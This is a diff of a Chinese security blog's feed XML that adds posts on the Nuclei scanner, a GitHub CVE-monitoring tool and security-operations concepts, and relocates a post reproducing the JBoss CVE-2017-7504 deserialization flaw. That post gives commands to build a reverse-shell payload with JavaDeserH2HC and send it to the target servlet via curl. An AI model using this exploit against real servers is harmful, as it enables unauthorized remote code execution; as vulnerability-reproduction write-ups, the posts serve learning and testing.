@@ -4,6 +4,81 @@
   
     
     <entry>
+      <title>国外扫描工具-Nuclei</title>
+      <link href="/article/da8eafa9.html"/>
+      <url>/article/da8eafa9.html</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/nuclei-logo.png" alt="Nuclei"></p><p><strong>Nuclei是一款运行速度非常快且易于使用的扫描工具，它可以帮助研究人员基于模板执行可配置的目标扫描任务，并提供了大量可扩展接口以辅助使用。</strong></p><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><ul><li><p>简单且模块化的代码，方便使用和开发；</p></li><li><p>运行速度快且完全可配置，使用了基于模板的引擎；</p></li><li><p>错误事件/特殊情况处理重传；</p></li><li><p>WAF处理；</p></li><li><p>智能匹配，实现零误报扫描；</p></li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><code>nuclei -h</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211028095416287.png" alt="image-20211028095416287"></p><p><strong>上述命令将显示该工具的帮助信息，下面给出的是该工具的常用选项：</strong></p><table><thead><tr><th>选项标签</th><th><strong>描述信息</strong></th><th>使用示例</th></tr></thead><tbody><tr><td><strong>-c</strong></td><td><strong>并发请求数(默认10)</strong></td><td><strong>nuclei -c 100</strong></td></tr><tr><td><strong>-l</strong></td><td><strong>需运行模板的URL列表</strong></td><td><strong>nuclei -l url.txt</strong></td></tr><tr><td><strong>-t</strong></td><td><strong>要检测的模板种类</strong></td><td><strong>nuclei -t git-core.yaml -t cves/</strong></td></tr><tr><td><strong>-o</strong></td><td><strong>保存输出结果文件(按需使用)</strong></td><td><strong>nuclei -o output.txt</strong></td></tr><tr><td><strong>-timeout</strong></td><td><strong>超时时间(默认为5秒)</strong></td><td><strong>nuclei -timeout 5</strong></td></tr><tr><td><strong>-proxy-url</strong></td><td><strong>输入代理地址</strong></td><td><strong>nuclei -proxy-url hxxp://127.0.0.1:8080</strong></td></tr><tr><td><strong>-proxy-socks-url</strong></td><td><strong>输入socks代理地址</strong></td><td><strong>nuclei -proxy-socks-url socks5://user:pass@Your IP:1080</strong></td></tr><tr><td><strong>-random-agent</strong></td><td><strong>使用随机的UA</strong></td><td><strong>nuclei -random-agent</strong></td></tr><tr><td><strong>-H</strong></td><td><strong>自定义请求头</strong></td><td><strong>nuclei -H “x-bug-bounty:hacker”</strong></td></tr><tr><td><strong>-update-templates</strong></td><td><strong>下载或者升级模板</strong></td><td><strong>nuclei -update-templates</strong></td></tr><tr><td><strong>-stats</strong></td><td><strong>使用进度条</strong></td><td><strong>nuclei -stats</strong></td></tr><tr><td><strong>-debug</strong></td><td><strong>调试请求或者响应</strong></td><td><strong>nuclei -debug</strong></td></tr><tr><td><strong>-burp-collaborator-biid</strong></td><td><strong>使用burp-collaborator插件</strong></td><td><strong>nuclei -burp-collaborator-biid XXXX</strong></td></tr></tbody></table><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p><strong>代码安装：</strong></p><p>在该项目GitHub库中的<a href="https://github.com/projectdiscovery/nuclei/releases">Releases</a>页面中根据自己的平台选择预编译好的源代码，然后使用<code>tar</code>命令进行代码提取，将提取出的代码移动到自己的$PATH路径下。所使用的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;projectdiscovery&#x2F;nuclei&#x2F;releases&#x2F;download&#x2F;v2.5.3&#x2F;nuclei_2.5.3_linux_amd64.zipunzip nuclei_2.5.3_linux_amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全工具库 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Nuclei </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>GitHub-CVE与工具监控</title>
+      <link href="/article/92446bce.html"/>
+      <url>/article/92446bce.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="一-拉取项目"><a href="#一-拉取项目" class="headerlink" title="一 拉取项目"></a>一 拉取项目</h2><h3 id="1-1-简介："><a href="#1-1-简介：" class="headerlink" title="1.1 简介："></a>1.1 简介：</h3><p>监控github上新增的cve编号项目漏洞和监控github发布工具更新，推送钉钉或者server酱</p><h3 id="1-2-项目地址"><a href="#1-2-项目地址" class="headerlink" title="1.2 项目地址"></a>1.2 项目地址</h3><p><code>https://github.com/yhy0/github-cve-monitor</code></p><h3 id="1-3-拉取部署"><a href="#1-3-拉取部署" class="headerlink" title="1.3 拉取部署"></a>1.3 拉取部署</h3><p><code>https://github.com/yhy0/github-cve-monitor.git</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027200514536.png" alt="image-20211027200514536"></p><p>安装必备库：<code>pip3 install -r  requirements.txt</code></p><h3 id="1-4-配置推送"><a href="#1-4-配置推送" class="headerlink" title="1.4 配置推送"></a>1.4 配置推送</h3><p><strong>钉钉机器人：</strong>新建一个群–&gt;群设置–&gt;智能群助手(机器人管理)–&gt;添加机器人–&gt;选择”自定义 通过Webhook接入自定义服务”</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201714294.png" alt="image-20211027201714294"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027201924581.png" alt="image-20211027201924581"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202023135.png" alt="image-20211027202023135"></p><p>配置config.yaml：</p><p><strong>enable: 0为关闭、enable: 1为开启。</strong>这里我开启的是飞书，假若你要开启其他的 就关闭飞书这个。以免麻烦</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202452504.png" alt="image-20211027202452504"></p><h3 id="1-5-gihtub-token-获取"><a href="#1-5-gihtub-token-获取" class="headerlink" title="1.5 gihtub token 获取"></a>1.5 gihtub token 获取</h3><p>对于未经身份验证的请求，github 速率限制允许每小时最多 60 个请求</p><p>而通过使用基本身份验证的 API 请求，每小时最多可以发出 5,000 个请求</p><p><a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 创建token，时间的话选无限制的，毕竟要一直跑</p><p><img src="https://github.com/yhy0/github-cve-monitor/raw/master/images/image-20210729172507519.png" alt="image-20210729172507519"></p><h3 id="1-6-运行测试"><a href="#1-6-运行测试" class="headerlink" title="1.6 运行测试"></a>1.6 运行测试</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211027202829263.png" alt="image-20211027202829263"></p><p>后台运行:</p><p><code>screen  python github_cve_monitor.py</code></p><p><code>screen -ls</code> 查看正则运行的 screen</p><pre class="line-numbers language-none"><code class="language-none">screen -r github_cve#连接github_cve后台screen，如果存在的话<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-7-效果展示"><a href="#1-7-效果展示" class="headerlink" title="1.7 效果展示"></a>1.7 效果展示</h3><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211028121337881.png" alt="image-20211028121337881"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 威胁情报 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 威胁情报 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>理解安全运营</title>
+      <link href="/article/f8cfd5f1.html"/>
+      <url>/article/f8cfd5f1.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x0-安全运营的理解"><a href="#0x0-安全运营的理解" class="headerlink" title="0x0 安全运营的理解"></a>0x0 安全运营的理解</h2><h3 id="0-1-岗位理解"><a href="#0-1-岗位理解" class="headerlink" title="0.1 岗位理解"></a>0.1 岗位理解</h3><p><strong>比较安全运维与安全运营</strong></p><p><code>运维</code>：运维简而言之就是保障信息系统的正常运转。</p><p><code>安全运维</code> = 安全 + 运维</p><p><code>运营</code>：运营要<strong>持续的输出价值</strong>。</p><p><code>安全运营</code> = <code>安全</code> + <code>运营</code> = 通过已有的安全系统、工具来生产有价值的安全信息，把它用于解决安全风险，从而实现安全的最终目标。</p><h3 id="0-2-安全运营做什么？"><a href="#0-2-安全运营做什么？" class="headerlink" title="0.2 安全运营做什么？"></a>0.2 安全运营做什么？</h3><p><strong>领导的五大致命问题</strong></p><ul><li>什么人在攻击我们？</li><li>那些资产正在遭受攻击？</li><li>对比上周攻击有什么趋势？</li><li>主要攻击手法有那些？</li><li>我们最大的风险点在哪里？</li></ul><p>安全运营的日常就是对<strong>海量告警去粗取精的“萃取”</strong>的过程。</p><h4 id="如何萃取安全数据"><a href="#如何萃取安全数据" class="headerlink" title="如何萃取安全数据"></a>如何萃取安全数据</h4><p><code>Event-Alert-Threat-Incident</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185509.png" alt="img"></p><h4 id="从Event到Incident处理流程"><a href="#从Event到Incident处理流程" class="headerlink" title="从Event到Incident处理流程"></a>从Event到Incident处理流程</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185521-20211020165930413.png" alt="img"></p><ul><li><p>告警生成</p><ul><li>归一化，聚类分析</li><li>规则特征</li><li>算法模型</li><li>威胁情报</li></ul></li><li><p>威胁生成</p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185531-20211020170019988.png" alt="img"></p><ul><li>合并压缩</li><li>丰富化</li><li>误报筛选</li><li>置信度（置信区间展现的是这个参数的真实值有一定概率落在测量结果的周围的程度）</li></ul></li><li><p>威胁累积</p></li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185548.png" alt="img"></p><ul><li>场景汇聚</li><li>态势感知与响应业务场景</li><li>资产评分</li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185608.png" alt="img"></p><ul><li>威胁运营</li><li>安全事件</li></ul><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185635-20211020170301022-20211020170305743.png" alt="img"></p><h2 id="从安全事件分析角度"><a href="#从安全事件分析角度" class="headerlink" title="从安全事件分析角度"></a>从安全事件分析角度</h2><p>安全数据分析、安全事件分析是安全运营的一个核心模块，是一种服务、支持的能力。安全运营本身是为安全事件分析提供支撑，连接威胁狩猎（如果有的话）和应急响应中心，相当于企业安全“部队”中的指挥部。 安全运营为安全事件分析提供支撑，是整体网络安全保障。包括：</p><ul><li>网络安全规划</li><li>资产梳理</li><li>安全设备管理</li><li>渗透测试</li><li>漏洞扫描</li><li>威胁监控</li><li>安全事件分析</li><li>应急响应</li><li>风险评估等过程、服务</li></ul><p>覆盖到网络安全的各项工作，但是每一项服务又不是单独存在的个体，而是相互关联、重叠、交互，形成网络安全生态体系。[1] 简单来说，安全运营是企业安全的中枢，负责许多事务的处理，但不是每个方面都直接执行。比如上述讲到的应急响应、漏洞扫描、渗透测试，可能归属于事件响应部门（Incident Response），风险评估和处置可能归属于风控部门（Risk Management）等。 </p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/20200321185726-20211020170347185.png" alt="img"> </p><p>参考：<a href="https://wiki.y1ng.org/0x0_%E7%90%86%E8%A7%A3/0x3_%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9A%84%E8%A6%81%E7%B4%A0/">https://wiki.y1ng.org/0x0_%E7%90%86%E8%A7%A3/0x3_%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9A%84%E8%A6%81%E7%B4%A0/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全运营 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全运营 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>自助终端逃逸</title>
       <link href="/article/6cd3cbcb.html"/>
       <url>/article/6cd3cbcb.html</url>
@@ -214,33 +289,6 @@
     
     
     <entry>
-      <title>Jboss CVE-2017-7504</title>
-      <link href="/article/45a5e5d3.html"/>
-      <url>/article/45a5e5d3.html</url>
-      
-        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> JBOSS </tag>
-            
-            <tag> CVE-2017-7504 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>JBOSS CVE-2017-12149</title>
       <link href="/article/c3936183.html"/>
       <url>/article/c3936183.html</url>
@@ -260,6 +308,33 @@
             <tag> JBOSS </tag>
             
             <tag> CVE-2017-12149 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Jboss CVE-2017-7504</title>
+      <link href="/article/45a5e5d3.html"/>
+      <url>/article/45a5e5d3.html</url>
+      
+        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JBOSS </tag>
+            
+            <tag> CVE-2017-7504 </tag>
             
         </tags>
       
